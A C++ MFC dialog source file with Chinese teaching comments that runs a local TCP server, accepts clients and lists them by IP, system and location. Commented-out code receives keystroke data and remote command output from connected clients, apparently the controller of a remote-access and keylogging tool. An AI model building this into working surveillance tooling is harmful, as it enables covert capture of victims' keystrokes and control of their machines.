
// serverDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "server.h"
#include "serverDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CserverDlg 对话框



CserverDlg::CserverDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_SERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CserverDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//DDX_Control(pDX, IDC_LIST1, m_List);
	DDX_Control(pDX, IDC_LIST2, m_List);
}

BEGIN_MESSAGE_MAP(CserverDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST1, &CserverDlg::OnLvnItemchangedList1)
END_MESSAGE_MAP()


bool CserverDlg::InitAcceptSocket() {

	//1. socket 创建一个套接字（可以理解成管道的pipe句柄，用于后续的数据传输接口）
	m_hAcceptSocket = socket(
		AF_INET,    //INET协议簇
		SOCK_STREAM,    //表示使用的是TCP协议
		0
	);
	if (m_hAcceptSocket == INVALID_SOCKET) {
		//edit1.SetWindowTextW(TEXT("创建套接字失败！"));
		//printf("创建套接字失败！");
		return false;
	}


	//2. bind/listen 绑定/监听端口

	//IP地址：类似于网络中的家庭地址（很多网络应用）
	//端口用于区分是哪个应用的数据，只是一个编号0-65535。3389端口 远程连接 RDP     80端口 网页 http
	//一个应用软件可以有多少个端口？
	//看这里有多少个TCP连接
	//源ip:源端口  ------  目标ip:目标端口
	//挑选一个本机其他软件没有使用的端口来使用
	//sockaddr s;     //用于描述IP和端口的结构体,这个不好用，因为内部是一个数组

	sockaddr_in addr;      //用于替代sockaddr结构体，两者大小一致
	int nLength = sizeof(sockaddr_in);
	addr.sin_family = AF_INET;  //写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");   //连接到目标主机的IP
	//监听的端口可以做成配置文件 ini json xml
	addr.sin_port = htons(10087);      //h:host to n:network  short   坑，网络字节序（大尾方式）和本地字节序（小尾方式）
	int nRet = bind(m_hAcceptSocket, (sockaddr*)&addr, nLength);
	if (SOCKET_ERROR == nRet) {
		return false;
	}

	//监听
	nRet = listen(m_hAcceptSocket, 5);
	if (SOCKET_ERROR == nRet) {
		//printf("套接字监听端口失败！");
		//edit2.SetWindowTextW(TEXT("套接字监听端口失败！"));
		return false;
	}


	//开启线程来处理循环	使用Windows API CreateThread()
	//返回的是线程的句柄
	m_hAcceptThd = CreateThread(
		NULL,	//用于继承的安全属性
		0,		//默认的栈大小
		(LPTHREAD_START_ROUTINE)AcceptFuncThread,		//线程回调函数
		this,		//线程回调函数的参数

		0,			//标志位，填0，表示线程立马执行
					//填 CREATE_SUSPENDED	//表示线程挂起
					//ResumeThread(m_hAcceptThd);	//写这行代码才能让这个挂起的线程恢复运行
	
		0
		);


	



	return true;
}


void sc_ansiToUnicode(const std::string& str, std::wstring& sUnicode) {

	if (str.empty()) {
		return;
	}


	DWORD dwLen = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
	wchar_t* strUnicode = new wchar_t[dwLen];
	if (strUnicode == NULL) {
		return;
	}

	memset(strUnicode, 0, dwLen);
	MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, strUnicode, dwLen);
	sUnicode = strUnicode;
	delete[] strUnicode;

}


DWORD CserverDlg::AcceptFuncThread(LPVOID lpParam) {

	CserverDlg* pThis = (CserverDlg*)lpParam;

	while (true) {
		//3. accept 接受请求 等待别人连接
		//第一个参数s表示连接socket，专门用于连接
		/*
		struct sockaddr FAR *addr,
			   int      FAR *addrlen;
		*/
		sockaddr_in remoteAddr = { 0 };
		remoteAddr.sin_family = AF_INET;
		int addrlen = sizeof(sockaddr_in);

		//printf("等待客户端连接.....\n");
		//edit2.SetWindowTextW(TEXT("等待客户端连接.....\n"));
		//Sleep(1000);
		//返回的socket sClient是专门用于与客户端通信的socket,一般这里开线程循环接收

		//这里可以接收多个客户端的连接
		SOCKET sClient = accept(pThis->m_hAcceptSocket, (sockaddr*)&remoteAddr, &addrlen);
		if (sClient == INVALID_SOCKET) {

			return 0;
		}
		else {
			//printf("客户端已成功连接\n");
			//edit2.SetWindowTextW(TEXT("客户端已成功连接\n"));
		}

		//到这里表示有人要连接我，记录当前连接我的人是谁，并显示到界面
		//需要记录一个结构，来表示连接的人

		//创建出一个结构体，需要用堆来处理，记录了当前的连接的人的数据
		MySession* pSession = new MySession;
		pSession->client = sClient;	//保存客户端socket
		memcpy(&(pSession->addr), &remoteAddr, sizeof(sockaddr_in));
		pSession->dwLastTickout = GetTickCount();	//表示我们当前的时间

		//我们需要把他存起来

		{	//表示块作用域（局部），出了作用域会自动对锁对象 析构掉(会自动对锁构造（加锁）与析构（解锁）)，从而完成同步的操作，如果不写大括号，需要在插数据之前，加锁，插完数据之后，解锁
			//以后，凡是需要对map进行增删改查，都这样加上一句话
			std::lock_guard<std::mutex> lg(pThis->m_AcceptMtx);

			//对map进行插入操作 key --- sClient		value --- pSession
			//pThis->m_AcceptMtx.lock();
			pThis->m_map.insert(std::pair<SOCKET, MySession*>(sClient, pSession));
			//pThis->m_AcceptMtx.unlock();

			//两种写法，一种是通过api转换，一种是改变工程属性
			std::string strIp = inet_ntoa(remoteAddr.sin_addr);
			pSession->strIp = strIp;
			std::wstring wIp;
			//将IP从ascii转Unicode
			sc_ansiToUnicode(strIp, wIp);
			
			TCHAR szIpAddr[256] = { 0 };

			_stprintf(szIpAddr, _T("%s:%d"),
				wIp.c_str(),
				ntohs(remoteAddr.sin_port)
			);


			//将数据插入到对话框中
			pThis->m_List.InsertItem(pThis->m_map.size(), (LPCTSTR)szIpAddr);

			//这里需要开启一个线程来收数据，便于以后的处理
			//开一个线程循环读取客户端传来的数据,并显示

			/*
			std::thread thd([&]() {
				//表示程序拥有新的起点
				//这里可以使用pSession pThis等外界的变量
				while (TRUE)
				{
					//循环收取客户端socket传来的数据，并显示出来
					char szOutBuf[256] = {0};
					DWORD nReadBytes = 0;

					int nRet = recv(sClient, szOutBuf, 255, 0);
					if (nRet == 0) {
						//表示tcp断开了
						return 0;
					}
					else if (nRet > 0)
					{
						//打印传来的数据
						std::string str = pSession->strIp;
						str += ":";
						str += szOutBuf;
						OutputDebugStringA(str.c_str());
					}


					


				}
			}
			);
			thd.detach();
			*/

			/*
			std::thread thd([&]() {
				//表示程序拥有新的起点
				int nRet;
				char szBuf[1024] = { 0 };
				char szBuffer[2048] = { 0 };
				CString KeyBoardBuffer;
				CString CmdBuffer;
				while (TRUE)
				{
					//DWORD readBytesSize = 0;
					//char readBuf[1024] = { 0 };
					//Sleep(500);

					Sleep(50);
					MyPacket* pPkt = (MyPacket*)szBuf;
					//循环收包，确保收到一个完整的包

					nRet = recv(sClient, szBuf, sizeof(unsigned int) * 2, 0);
					if (nRet == 8) {
						if (pPkt->type == PACKET_REQ_KEYBOARD) {
							nRet = recv(sClient, szBuffer, pPkt->length, 0);
							if (nRet > 0) {
								KeyBoardBuffer += szBuffer;
								edit3.SetWindowTextW(KeyBoardBuffer);
							}
						}
						if (pPkt->type == PACKET_REQ_CMD) {
							nRet = recv(sClient, szBuffer, pPkt->length, 0);
							if (nRet > 0) {
								pThis->szOutBuffer += szBuffer;
								edit2.SetWindowTextW(pThis->szOutBuffer);
							}
						}

					}
					else {
						edit2.SetWindowTextW(TEXT("Recv Error"));
					}

				}

			});
			thd.detach();      //避免主线程结束时，子线程对象被销毁。
			*/







		}

	}
	return 0;
}




// CserverDlg 消息处理程序

BOOL CserverDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	ShowWindow(SW_MINIMIZE);

	// TODO: 在此添加额外的初始化代码

	//将网络的初始化放到这里


	m_List.InsertColumn(0, _T("IP:Port"));
	m_List.InsertColumn(1, _T("System"));
	m_List.InsertColumn(2, _T("Location"));		//通过IP反查地址

	m_List.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER);
	m_List.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);
	m_List.SetColumnWidth(2, LVSCW_AUTOSIZE_USEHEADER);

	//设置风格
	m_List.SetExtendedStyle(m_List.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

	//m_List.InsertItem(0, _T("123"));

	//开始初始化网络
	bool bRet = InitAcceptSocket();
	if (!bRet) {
		return FALSE;
	}







	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CserverDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CserverDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CserverDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CserverDlg::OnLvnItemchangedList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}
